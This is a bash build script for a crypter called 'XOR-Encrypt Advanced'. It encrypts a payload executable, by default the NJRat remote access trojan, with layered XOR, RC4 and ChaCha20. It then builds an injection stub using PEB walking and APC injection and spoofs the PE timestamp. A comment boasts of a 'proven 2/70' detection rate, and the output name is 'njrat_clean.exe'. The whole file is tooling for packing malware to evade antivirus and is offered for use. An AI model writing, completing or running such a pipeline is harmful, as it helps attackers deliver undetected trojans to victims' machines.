#!/bin/bash
# Build using Python stub generator (proven 2/70 method)
# Usage: ./build.sh [PAYLOAD] [OUTPUT] [PASSWORD] [LEVEL]
# Example: ./build.sh payloads/malware.exe output.exe MyPass123 8

# Check for help flag
if [[ "$1" == "--help" ]] || [[ "$1" == "-h" ]]; then
    cat << 'EOF'

========================================
XOR-Encrypt Advanced - Build Script
========================================

USAGE:
  ./build.sh [PAYLOAD] [OUTPUT] [PASSWORD] [LEVEL]

ARGUMENTS:
  PAYLOAD   - Path to payload executable to encrypt
              Default: payloads/NJRat.exe

  OUTPUT    - Output filename for encrypted executable
              Default: njrat_clean.exe

  PASSWORD  - Encryption password (alphanumeric + special chars)
              Default: SecureKey2026!

  LEVEL     - Encryption level (1-10, higher = more secure)
              Default: 6

OPTIONS:
  -h, --help   Show this help message

EXAMPLES:
  ./build.sh
    > Uses all default values

  ./build.sh payloads/custom.exe
    > Custom payload, other defaults

  ./build.sh payloads/custom.exe output.exe
    > Custom payload and output name

  ./build.sh payloads/custom.exe output.exe MyPass123
    > Custom payload, output, and password

  ./build.sh payloads/custom.exe output.exe MyPass123 8
    > All custom parameters

PROCESS:
  [1/3] Encrypts payload with XOR + RC4 + ChaCha20
  [2/3] Generates stub with PEB walk and APC injection
  [3/3] Spoofs PE timestamp to 2018

OUTPUT:
  Encrypted executable saved to: build/[OUTPUT]

========================================
EOF
    exit 0
fi

# Parse arguments with defaults
PAYLOAD="${1:-payloads/NJRat.exe}"
OUTPUT="${2:-njrat_clean.exe}"
PASSWORD="${3:-SecureKey2026!}"
LEVEL="${4:-6}"

echo "========================================"
echo "CLEAN BUILD - Using Python Stub"
echo "========================================"
echo ""
echo "Configuration:"
echo "  Payload:  $PAYLOAD"
echo "  Output:   $OUTPUT"
echo "  Password: $PASSWORD"
echo "  Level:    $LEVEL"
echo "========================================"

echo ""
echo "[1/3] Encrypting payload..."
python3 xorcrypt_advanced.py encrypt "$PAYLOAD" temp_payload.enc -p "$PASSWORD" -l "$LEVEL"
if [ $? -ne 0 ]; then
    echo "ERROR: Encryption failed"
    exit 1
fi

echo ""
echo "[2/3] Generating stub (NO polymorphic, NO memory-protect)..."
python3 xorcrypt_advanced.py stub temp_payload.enc "build/$OUTPUT" -p "$PASSWORD" -l "$LEVEL"
if [ $? -ne 0 ]; then
    echo "ERROR: Stub generation failed"
    exit 1
fi

echo ""
echo "[3/3] Spoofing timestamp..."
python3 metadata_spoof.py "build/$OUTPUT" "build/$OUTPUT" 2018
if [ $? -ne 0 ]; then
    echo "ERROR: Timestamp spoofing failed"
    exit 1
fi

echo ""
echo "========================================"
echo "SUCCESS!"
echo "Output: build/$OUTPUT"
echo "========================================"

rm -f temp_payload.enc

ls -lh "build/$OUTPUT"
exit 0
